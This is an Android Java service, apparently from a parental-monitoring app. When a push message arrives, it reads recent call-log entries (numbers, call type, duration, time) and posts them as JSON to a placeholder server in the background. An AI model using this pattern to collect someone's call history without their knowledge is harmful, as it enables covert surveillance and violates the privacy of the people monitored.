package com.example.service;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.CallLog;
import android.util.Log;

public class CloudMessageContactsService extends Service{

	Context context;
	String regid;
	Intent i;
	
	private static final String PARAMETER_USER = "user";
	private static final String PARAMETER_ACTION = "action";
	private static final String PARAMETER_CONTACTS = "condata";
	private static final String URL = "http://xxx";
	private static final String USER_KID = "kid";
	private static final String ACTION_SEND_CONTACTS = "sendcontacts";
	
	@Override
	public IBinder onBind(Intent arg0) {
	
		return null;
	}

	
	@Override
	public int onStartCommand(final Intent intent, int flags, int startid) {

		 Log.i("Usluga", "contacts service start");
		
		 i = intent;
		 context = getApplicationContext();
		 
		 String contacts = getContacts();
		 
		 if(contacts != null){
			 Log.i("Usluga", "contacts: " +contacts);
		 }
		 else
			 contacts = "";
		 

		 new SendContactsAsyncTask().execute(contacts);
		 
		 
		 return START_NOT_STICKY;
	}
	
	
	@Override
	public void onDestroy() {
        super.onDestroy();
		Log.i("Usluga", "contacts service stop");
	}
	
	
	
	private String getContacts(){
	
		String sjson;
		ContentResolver cr = getContentResolver();
		Cursor managedCursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);
    	int number= managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
    	int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
    	int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
    	int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
    	
    	
    	 JSONObject callLogItem;
    	 JSONArray callLogItems = new JSONArray();

    	 while (managedCursor.moveToNext()) {
    		 
    		 	if(callLogItems.length()>10)
    		 		break;
    		 
    		   callLogItem = new JSONObject();
    		   String phNumber = managedCursor.getString(number);
    		   String callType = managedCursor.getString(type);
    		   String callDate = managedCursor.getString(date);
    		   Date callDayTime = new Date(Long.valueOf(callDate));

    		   long hour = managedCursor.getLong(date);
    		   SimpleDateFormat dateP = new SimpleDateFormat("HH:mm:ss") ;
    		   String time = dateP.format(new Date(hour));
    		   String callDuration = managedCursor.getString(duration);
    		   String dir = null;
    		   int dircode = Integer.parseInt(callType);
    		   switch (dircode) {
    		   case CallLog.Calls.OUTGOING_TYPE:
    		    dir = "Wychodzace";
    		    break;

    		   case CallLog.Calls.INCOMING_TYPE:
    		    dir = "Przychodzace";
    		    break;

    		   case CallLog.Calls.MISSED_TYPE:
    		    dir = "Nieodebrane";
    		    break;
    		   }
    		
    	      try {
				callLogItem.put("Numer", phNumber);
				callLogItem.put("Typ", dir);
				callLogItem.put("Czas", callDuration);
				callLogItem.put("Godzina", time);
	    		callLogItems.put(callLogItem);
    		  
    		     } catch (JSONException e) {
    			  Log.i("Usluga", "json errror");
			     }
    		 
             
    		
    		  }
    	
    		 managedCursor.close();
 
    	     sjson = callLogItems.toString();
		
		return sjson;
		
	}
	
	private void sendToServer(String jsonData){
		
		HttpClient client = new DefaultHttpClient();
        HttpPost httpPost = new HttpPost(URL);

        

        try
        {
       	 
       	 List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

            nameValuePairs.add(new BasicNameValuePair(PARAMETER_ACTION, ACTION_SEND_CONTACTS));
            nameValuePairs.add(new BasicNameValuePair(PARAMETER_USER, USER_KID));
            nameValuePairs.add(new BasicNameValuePair(PARAMETER_CONTACTS, jsonData));
       	 
            httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
            HttpResponse response = client.execute(httpPost);

            InputStream inputStream = response.getEntity().getContent();
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            StringBuilder stringBuilder = new StringBuilder();
            String line = null;

            while((line = bufferedReader.readLine()) != null)
                   stringBuilder.append(line);

            
            Log.i("Usluga", "Response: " + response.getStatusLine().getStatusCode());
            
         }catch (ClientProtocolException e) {
       	  Log.i("Usluga", "ClientProtocolException");
        } catch (UnsupportedEncodingException e) {
       	 Log.i("Usluga", "UnsupportedEncodingException");
        } catch (IOException e) {
       	 Log.i("Usluga", "IOException");
        }
		
       
	}
	
	
	
	private class SendContactsAsyncTask extends AsyncTask<String, Void, Void>{

			
		
		public SendContactsAsyncTask() {
			super();
			
		}

		@Override
		protected void onPreExecute() {

			super.onPreExecute();
		}
		
		@Override
		protected Void doInBackground(String... p) {
			Log.i("Usluga", "Sending to server");		
			sendToServer(p[0]);
			return null;
	
		}

		@Override
		protected void onPostExecute(Void v) {
		
			CloudMessageReceiver.completeWakefulIntent(i);
			stopSelf();
			super.onPostExecute(null);
		}

		

	}
	
	
	
}
